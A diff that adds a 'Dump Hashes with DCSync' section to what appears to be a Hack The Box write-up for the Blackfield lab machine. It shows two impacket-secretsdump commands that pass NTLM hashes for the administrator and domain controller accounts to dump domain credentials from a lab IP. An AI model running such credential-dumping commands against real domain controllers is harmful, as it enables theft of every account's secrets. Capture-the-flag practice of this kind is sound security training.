@@ -157,3 +157,13 @@ rpcclient $> exit
 
 ---
 
+## Dump Hashes with DCSync
+```CSS
+▶ impacket-secretsdump blackfield.local/administrator@10.10.10.192 -hashes :7f1e4ff8c6a8e6b6fcae2d9c0572cd62 -dc-ip 10.10.10.192
+```
+```CSS
+▶ impacket-secretsdump blackfield.local/'dc01$'@10.10.10.192 -hashes :b624dc83a27cc29da11d9bf25efea796 -dc-ip 10.10.10.192
+
+```
+![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/abfc08ef-f1ce-4810-b158-7d8a89c8f53a)
+
